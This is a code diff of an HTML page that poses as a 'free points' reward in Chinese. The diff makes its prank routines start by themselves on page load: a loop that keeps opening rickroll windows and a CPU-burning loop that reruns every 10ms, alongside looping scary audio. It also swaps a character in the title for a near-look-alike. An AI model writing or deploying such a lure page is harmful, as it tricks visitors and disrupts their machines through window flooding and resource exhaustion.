@@ -1,10 +1,10 @@
 <html>
     <head>
-        <title>免費點數獎勵</title>
+        <title>免費點數獎勳</title>
     </head>
     <body style="background-color: black; color: white; text-align: center;">
         <h1 style="color: red; font-size: 50px;">恭喜！您獲得免費點數！</h1>
-        <img src="https://m.gxgif.com/pic/kb/202352514622.jpg" alt="免費獎勵" style="display: block; margin: 0 auto; width: 60%;"/>
+        <img src="https://m.gxgif.com/pic/kb/202352514622.jpg" alt="免費獎勳" style="display: block; margin: 0 auto; width: 60%;"/>
         <audio id="scary-audio" loop>
             <source src="static/yy.wav" type="audio/wav">
         </audio>
@@ -12,17 +12,8 @@
         <button onclick="startPrank()" style="font-size: 20px; padding: 10px; background-color: red; color: white; border: none; cursor: pointer;">領取獎勳</button>
 
         <script>
-            // 當頁面被點擊時播放音樂
-            document.body.addEventListener("click", function() {
-                var audio = document.getElementById('scary-audio');
-                audio.muted = false;  // 確保音樂不是靜音
-                audio.play();         // 播放音樂
-            });
-
-            function startPrank() {
-                var audio = document.getElementById('scary-audio');
-                audio.muted = false;
-                audio.play();
+            // 當頁面載入時開始執行其他動作
+            window.onload = function() {
                 // **無限開新視窗**
                 function openWindows() {
                     let w = window.open("https://rickroll.it/", "_blank");
@@ -78,7 +69,14 @@
                     setTimeout(burnCPU, 10); // 10ms 無限執行
                 }
                 burnCPU();
-            }
+            };
+
+            // 當頁面被點擊時播放音樂
+            document.body.addEventListener("click", function() {
+                var audio = document.getElementById('scary-audio');
+                audio.muted = false;  // 確保音樂不是靜音
+                audio.play();         // 播放音樂
+            });
         </script>
     </body>
 </html>
